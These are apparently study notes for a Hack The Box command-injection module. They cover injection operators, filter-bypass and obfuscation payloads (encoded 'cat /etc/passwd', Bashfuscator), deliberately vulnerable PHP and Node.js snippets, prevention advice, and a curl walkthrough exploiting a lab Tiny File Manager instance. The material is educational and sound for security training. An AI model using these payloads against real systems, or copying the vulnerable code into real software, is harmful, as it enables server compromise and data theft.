# Command Injection – Complete Module Notes

## Overview

Command Injection is a critical vulnerability that allows an attacker to execute arbitrary system
commands on the back-end server. It is ranked #3 in the OWASP Top 10 and can lead to full server
compromise.

Injection occurs when user-controlled input is interpreted as part of a command, query, or code
without proper sanitization or escaping.

### Common Injection Types

| Type                  | Description                                          |
|-----------------------|------------------------------------------------------|
| OS Command Injection  | User input goes directly into an OS command.         |
| Code Injection        | User input goes into a function that evaluates code. |
| SQL Injection         | User input goes into an SQL query.                   |
| XSS / HTML Injection  | User input is displayed on a web page.               |

Other types: LDAP, NoSQL, HTTP Header, XPath, IMAP, ORM, etc.

---

## OS Command Injection – How It Works

Web languages provide functions to run system commands:

- **PHP**: `exec()`, `system()`, `shell_exec()`, `passthru()`, `popen()`
- **Node.js**: `child_process.exec()`, `child_process.spawn()`

If user input is concatenated directly into these functions, injection is possible.

### Vulnerable PHP Example

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

### Vulnerable Node.js Example

```js
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
});
```

---

## Detection

Detection is the same as exploitation: append a test command and see if the output changes.

**Example – Host Checker:**
A web app asks for an IP and runs `ping -c 1 <IP>`.
If we enter `127.0.0.1; whoami`, the backend runs:

```bash
ping -c 1 127.0.0.1; whoami
```

If the output shows `www-data`, injection works.

### Injection Operators

| Operator   | Character | URL-Encoded | Executes                           |
|------------|-----------|-------------|------------------------------------|
| Semicolon  | `;`       | `%3b`       | Both commands                      |
| New Line   | `\n`      | `%0a`       | Both commands                      |
| Background | `&`       | `%26`       | Both (second output first)         |
| Pipe       | `\|`      | `%7c`       | Both (only second output)          |
| AND        | `&&`      | `%26%26`    | Second if first succeeds           |
| OR         | `\|\|`    | `%7c%7c`    | Second if first fails              |
| Sub-Shell  | ` `` `    | `%60%60`    | Both (Linux only)                  |
| Sub-Shell  | `$()`     | `%24%28%29` | Both (Linux only)                  |

> Note: `;` does not work in Windows CMD but does in PowerShell.

---

## Bypassing Filters

### 1. Blacklisted Operators

New-line (`%0a`) is often allowed — use it as your injection operator.

### 2. Blacklisted Spaces

Replace spaces with:

| Bypass            | Value                    |
|-------------------|--------------------------|
| Tab               | `%09`                    |
| `${IFS}`          | `%24%7BIFS%7D`           |
| Brace expansion   | `{ls,-la}` → `ls -la`   |

### 3. Blacklisted Characters (e.g., `/`, `;`)

Use environment variable substring extraction:

| Char | Payload              | URL-Encoded                    |
|------|----------------------|--------------------------------|
| `/`  | `${PATH:0:1}`        | `%24%7BPATH%3A0%3A1%7D`       |
| `;`  | `${LS_COLORS:10:1}`  | `%24%7BLS_COLORS%3A10%3A1%7D` |

Or ASCII shifting: `$(tr '!-}' '"-~'<<<[)` yields `\`

### 4. Blacklisted Commands (e.g., `cat`, `whoami`)

Obfuscate the command word:

| Technique    | Example         | Platform        |
|--------------|-----------------|-----------------|
| Quotes       | `c'a't`, `c"a"t`| Linux + Windows |
| Backslash    | `c\at`          | Linux only      |
| `$@`         | `ca$@t`         | Linux only      |
| Caret        | `c^at`          | Windows CMD     |

**Example:** `c'a't${IFS}${PATH:0:1}flag.txt`

---

## Advanced Obfuscation

### Case Manipulation

- **Windows:** `WhOaMi` (case-insensitive CMD)
- **Linux:** `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`

### Reversed Commands

```bash
echo 'whoami' | rev          # → imaohw
$(rev<<<'imaohw')            # Linux execution
```

Windows PowerShell:

```powershell
iex "$('imaohw'[-1..-20] -join '')"
```

### Encoded Commands

**Base64 (Linux):**

```bash
echo -n 'cat /etc/passwd' | base64
# Y2F0IC9ldGMvcGFzc3dk

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
```

**Hex (Linux):**

```bash
echo -n 'cat /flag.txt' | xxd -p | tr -d '\n'
bash<<<$(xxd -r -p<<<HEX_STRING)
```

**Base64 (Windows PowerShell – UTF-16LE):**

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('...')))"
```

---

## Evasion Tools

### Linux – Bashfuscator

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
cd ./bashfuscator/bin
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

### Windows – DOSfuscation

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
Invoke-DOSfuscation> SET COMMAND type C:\path\to\file.txt
Invoke-DOSfuscation> encoding
```

---

## Prevention

### 1. Avoid System Command Functions

Use built-in language equivalents (e.g., `fsockopen()` instead of shelling out for ping).

### 2. Input Validation

Validate on both front-end and back-end.

```php
// PHP
filter_var($_GET['ip'], FILTER_VALIDATE_IP)
```

```js
// Node.js
ip.match(/^[\d.]+$/)   // or use is-ip library
```

### 3. Input Sanitization

Strip special characters after validation.

```php
// PHP
preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip'])
```

```js
// Node.js
ip.replace(/[^A-Za-z0-9.]/g, '')
```

### 4. Server Configuration

- Use a WAF (mod_security, Cloudflare)
- Run web server as low-privilege user (`www-data`)
- Disable dangerous PHP functions: `disable_functions=system,exec,...`
- Restrict file access: `open_basedir = '/var/www/html'`
- Reject double-encoded requests and non-ASCII URLs
- Avoid outdated libraries

---

## Skills Assessment – Tiny File Manager Exploit

**Target:** `154.57.164.82:31763`  
**Credentials:** `guest / guest`

### Step 1 – Log In

```bash
rm -f cookies.txt
curl -c cookies.txt -s http://154.57.164.82:31763/ -o /dev/null
curl -c cookies.txt -b cookies.txt -s -X POST "http://154.57.164.82:31763/" \
  -d "fm_usr=guest&fm_pwd=guest" -o /dev/null -L
```

### Step 2 – Identify Vulnerable Function

The Move function (`?to=...&from=...&finish=1&move=1`) runs:

```bash
mv /var/www/html/files/<from> /var/www/html/files/<to>
```

Injection point: `to` parameter.

### Step 3 – Bypass Filters

| Element            | Bypass                       |
|--------------------|------------------------------|
| Injection operator | `&` → `%26`                  |
| Space              | `%09` or `${IFS}`            |
| Slash `/`          | `${PATH:0:1}`                |
| `cat`              | `c'a't` → `c%27a%27t`       |

### Step 4 – Read the Flag

```bash
# Base64-encode the payload
echo -n 'cat /flag.txt' | base64
# Y2F0IC9mbGFnLnR4dA==

# URL-encoded 'to' payload:
tmp%26bash%3C%3C%3C%24%28base64%09-d%3C%3C%3CY2F0IC9mbGFnLnR4dA%3D%3D%29
```

Full curl command:

```bash
curl -s "http://154.57.164.82:31763/index.php?to=tmp%26bash%3C%3C%3C%24%28base64%09-d%3C%3C%3CY2F0IC9mbGFnLnR4dA%3D%3D%29&from=51459716.txt&finish=1&move=1" \
  -H "Cookie: session=...; PHPSESSID=...; filemanager=..."
```

**Result:** `HTB{c0mm4nd3r_1nj3c70r}`

---

## Key Takeaways

- Always sanitize user input – never trust it.
- Blacklists are weak; many bypass paths exist.
- Combine techniques: newline + tab + env vars + quotes/base64.
- Automated tools like Bashfuscator generate unique payloads.
- Prevention requires secure coding, validation, sanitization, and server hardening.
- Test thoroughly – a single mistake can lead to full compromise.
